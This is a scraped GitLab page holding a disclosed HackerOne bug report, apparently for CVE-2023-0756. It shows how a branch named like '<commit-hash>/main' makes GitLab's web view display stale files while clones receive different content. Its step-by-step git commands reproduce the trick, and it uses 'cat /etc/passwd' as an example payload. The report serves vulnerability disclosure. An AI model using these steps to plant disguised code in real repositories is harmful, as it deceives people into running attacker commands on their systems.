=== Content from gitlab.com_065296da_20250114_221717.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-0756.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-0756.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-0756.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-0756.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  May 03, 2023

  [48000e9f](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  ·
  48000e9f

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 03, 2023

  48000e9f

  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 03, 2023

Loading



=== Content from gitlab.com_a00ef80a_20250114_221718.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# The main branch of a repository with a specially designed name allows an attacker to create repositories with malicious code.

**[HackerOne report #1864278](https://hackerone.com/reports/1864278)** by `st4nly0n` on 2023-02-06, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

# Description:

The main branch of a repository with a specially crafted name allows an attacker to create repositories with malicious code, victims who clone or download these repositories will execute arbitrary code on their systems.

When the main branch of a repository has the name `<commit-hash>/<directory>`, for example, `3038cd56e64b952a122215b4bef05814d7a25182/main`, the Gitlab web interface will not display the files belonging to **HEAD**, the Gitlab web interface will display the contents of the files within the main directory that belong to commit `3038cd56e64b952a122215b4bef05814d7a25182`.

In this state, the Gitlab web interface is not able to show the actual content of the files, the web interface will always show the content of the files in commit `3038cd56e64b952a122215b4bef0581414d7a25182`, however, when downloading the repository from the web interface or when cloning via **CLI**, the victim gets the content of the files from **HEAD**.

# Steps To Reproduce:

* *The following steps must be performed as the attacker user*

**1.** Create a public repository *(Initialize README.md)*.

**2.** Unprotect the `main` branch.

**3.** Clone and enter the repository:

```
git clone <repo>
cd <repo>
```

**4.** Create a `hello.sh` file, with harmless code:

```
echo "echo 'hello world'" > hello.sh
```

**5.** Create a directory named `main`:

```
mkdir main
```

**6.** Copy the `README.md` and `hello.sh` files to the `main` directory:

```
cp README.md main/ && cp hello.sh main/
```

**7.** Delete git history:

```
git update-ref -d HEAD
```

**8.** Confirm changes and push to remote:

```
git add .
git commit -m 'Init'
git push origin HEAD -f
```

**9.** Create a **shell variable** with the date of the last commit:

```
GIT_COMMITTER_DATE=$(git show -s --format=%cd $(git rev-parse HEAD))
```

**10.** Create a branch with the following format `<last-commit-hash>/<main>`:

```
git checkout -b "$(git rev-parse HEAD)/main"
```

**11.** Push the branch to the remote:

```
git push origin HEAD -f
```

**12.** From the web interface, change the default branch to `<last-commit-hash>/<main>` created earlier.

**13.** Remove the `main` branch:

```
git push origin -d main
```

**14.** Remove the `main` directory from the `<last-commit-hash>/<main>` branch:

```
rm -rf main/
```

**15.** Change the content of `hello.sh` with the **payload** of your choice:

```
###  EXAMPLE:
echo 'cat /etc/passwd' > hello.sh
```

**16.** Delete git history:

```
git update-ref -d HEAD
```

**17.** Confirm the changes with the modified date and push to remote:

```
git add .
git commit -m 'Init' --date "$GIT_COMMITTER_DATE"
git push origin HEAD -f
```

As a result of this behavior, the proof-of-concept video shows how the victim views a repository through the Gitlab web interface, for the victim the `hello.sh` file does not represent a security risk; however, once it downloads or clones the repository and executes the `hello.sh` file, it executes an unexpected command.

**Poc Video**

[poc.mp4](https://user-content.gitlab-static.net/e2685edcb2ee15f962525d8c5becf8f1ff2b8fcc/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63643766346631392d616264362d343339632d396261392d6566633065383064333235652f706f632e6d7034 "Download 'poc.mp4'")

# What is the current *bug* behavior?

The web interface does not guarantee file integrity when the main branch name has a specially crafted name. This allows an attacker to create repositories with poisoned content.

# What is the expected *correct* behavior?

The files in the main branch of a repository that are displayed through the Gitlab web interface must be the same as the ones you get when downloading or cloning the repository.

# Output of checks

This bug happens on GitLab.com

#### Impact

An attacker can get a victim to execute unexpected arbitrary commands on his system if the victim clones and executes files from a repository that initially do not pose a security risk.

For the proof of concept the victim has executed the calculator on his system, however, through what is described in this report, an attacker will want to take control of the victim's system or obtain confidential information, this attack manages to impact the availability, integrity and confidentiality of the affected user.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [poc.mp4](https://h1.sec.gitlab.net/a/cd7f4f19-abd6-439c-9ba9-efc0e80d325e/poc.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


